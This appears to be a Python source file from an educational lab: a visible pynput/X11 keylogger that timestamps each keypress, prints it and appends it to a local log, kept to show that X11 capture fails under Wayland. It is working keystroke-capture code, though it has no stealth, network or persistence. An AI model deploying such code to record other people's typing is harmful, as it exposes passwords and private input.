#!/usr/bin/env python3
"""
CONTRAST ARTIFACT — X11/pynput keylogger that FAILS on Wayland.

This is the "textbook" Python keylogger built on pynput, which captures
keystrokes through the X11 API. It is kept here only to demonstrate the
starting point of the lab: on a modern Wayland session it runs but captures
nothing, because Wayland isolates input between applications by design.

The working, Wayland-compatible capture path lives in keylogger_evdev.py.

Scope: education / defensive research only, on a machine you own, logging only
your own keystrokes. No stealth, no network, no persistence.
"""

import sys
from datetime import datetime
from pathlib import Path

try:
    from pynput import keyboard
except ImportError:
    print("Missing dependency: pynput  ->  pip install pynput", file=sys.stderr)
    sys.exit(1)

LOG_FILE = Path(__file__).resolve().parent / "keystrokes.log"


def timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def format_key(key):
    if hasattr(key, "char") and key.char is not None:
        return key.char
    try:
        return key.name.upper()
    except AttributeError:
        return str(key)


def on_press(key):
    line = f"{timestamp()} PRESS {format_key(key)}"
    print(line, flush=True)
    try:
        with LOG_FILE.open("a", encoding="utf-8") as f:
            f.write(line + "\n")
    except OSError as exc:
        print(f"Failed to write log: {exc}", file=sys.stderr, flush=True)


def main():
    print("X11/pynput keylogger started (will NOT capture under Wayland).", flush=True)
    print(f"Log file: {LOG_FILE}", flush=True)
    print("Press Ctrl+C to stop.", flush=True)
    with keyboard.Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("\nStopping.", flush=True)


if __name__ == "__main__":
    main()
